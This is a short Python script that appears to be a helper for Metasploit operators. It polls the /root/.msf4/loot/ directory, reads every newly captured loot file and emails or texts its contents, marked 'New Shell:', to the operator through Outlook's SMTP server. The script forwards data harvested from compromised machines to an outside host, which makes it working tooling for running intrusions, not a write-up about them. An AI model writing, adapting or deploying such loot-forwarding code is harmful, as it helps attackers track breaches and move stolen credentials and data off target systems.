#!/usr/bin/python
import smtplib
import time
import os
import sys

PATH = '/root/.msf4/loot/'
EMAIL = '' #Enter email here
TO = '' #Enter the email address of the phone here
PASS = ''
msg = ''
files = os.listdir(PATH)
SERVER  = smtplib.SMTP()
#For Gmail use smtp.gmail.com   (possibly port 25 with gmail? )
SERVER.connect('smtp-mail.outlook.com', '587')
SERVER.starttls()
SERVER.login(EMAIL, PASS)

while 1:
	fi = os.listdir(PATH)
	if set(files) > set(fi):
		print 'File removed' #Do nothing this is the case where something has been removed
	else:
		if fi != files:
			print 'New files: Sending message'
			New = list(set(fi) - set(files))
			#Iterates through all new files
			for i in New:
				#Opens each loot file
				f = open(os.path.join(PATH, i), 'r')
				#Puts the data from the loot file into msg
				msg = f.read()
				#Close file 
				f.close()
				#Have to append a new line to the front of message or the sendmail skips the first list
				msg = '\nNew Shell:\n' + msg
				#Sends SMS/Email
				SERVER.sendmail(EMAIL, TO, msg)
				msg = ''
		else: 
			print 'No new files'
	#Resets the the list of loot that we currently have
	files = os.listdir(PATH)
	#Sleep so it doesn't run too fast and use too many resources
	time.sleep(5)
SERVER.quit()